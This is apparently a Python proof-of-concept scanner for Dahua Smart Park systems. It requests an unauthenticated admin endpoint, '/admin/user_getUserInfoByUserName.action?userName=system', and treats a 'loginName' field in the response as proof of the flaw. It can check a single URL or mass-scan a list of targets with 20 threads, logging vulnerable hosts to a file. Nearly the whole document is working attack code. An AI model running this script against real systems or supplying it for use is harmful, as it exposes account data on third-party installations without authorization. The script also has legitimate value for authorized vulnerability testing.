import argparse, requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

url_list = []


def banner():
    test = """
 
      ____  _   _ ______   _ 
     |  _ \| | | |__  / | | |
     | | | | |_| | / /| |_| |
     | |_| |  _  |/ /_|  _  |
     |____/|_| |_/____|_| |_|
                             

"""
    print(test)


def poc(target):
    payload = "/admin/user_getUserInfoByUserName.action?userName=system"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=5,proxies=proxies)
        # print(res1.text)
        if "loginName" in res1.text:
            print(f"[+]{target}存在漏洞")
            with open("大华_result.txt","a",encoding='utf-8') as f:
                f.write(f"{target}存在漏洞\n")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")

def main():
    banner()
    parser =argparse.ArgumentParser(description="大华智慧园区")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")



if __name__ == '__main__':
    main()